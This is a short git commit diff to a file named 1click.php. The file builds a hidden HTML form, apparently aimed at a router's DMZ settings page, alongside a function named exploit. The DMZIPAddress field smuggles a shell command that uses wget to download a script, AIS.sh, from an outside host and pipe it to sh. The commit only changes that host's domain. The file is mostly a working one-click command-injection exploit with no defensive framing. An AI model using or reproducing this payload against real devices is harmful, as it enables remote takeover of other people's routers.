9f75182590ddc9272c690188bb3dae04ae432aa2
freekonek_92 <166968786+freekonek@users.noreply.github.com>
2024-06-13 03:55:45 +0800

    Update 1click.php

--- 1click.php
+++ 1click.php
@@ -2,7 +2,7 @@
 <input name="goformId" value="DMZ_SETTING" type="hidden">
 <input name="isTest" value="false" type="hidden">
 <input name="DMZEnabled" value="1" & type="hidden">
-<input name="DMZIPAddress" value="127.0.0.1 | wget http://freekonek.oi/AIS.sh -O - | sh &"type="hidden">
+<input name="DMZIPAddress" value="127.0.0.1 | wget http://freekonek.github.oi/AIS.sh -O - | sh &"type="hidden">
 <input type="submit" style="display:none;"></form>
 <script>
 function exploit () {
